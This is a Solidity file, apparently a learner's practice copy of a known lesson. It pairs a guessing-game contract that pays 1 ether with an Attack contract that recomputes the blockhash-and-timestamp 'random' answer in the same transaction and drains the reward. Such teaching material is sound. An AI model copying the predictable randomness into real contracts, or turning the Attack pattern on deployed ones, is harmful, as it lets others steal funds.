// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GuessTheRandomNumber {
    uint private answer;
    event MessageLogged(string message);


    constructor() payable {
        //answer being intialiated isnt the same with (OG) attack function call
        // answer = uint(
        //     keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        // );

    }

    function guess(uint _guess) public {
        //OG postion 
        answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
        else {
            emit MessageLogged("wrong guess. try again.");

        }
    }

    function showNum() public view returns (uint){
        return answer;
    }

    
}

contract Attack {
    uint public answer;
    event MessageLogged(string message);

    //not a constructor only recieves and gets called when recieved. dont put anything in here 
    receive() external payable {}


    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        //lets try again with the adress of the function , then ill call answer after i call this function 
        answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}
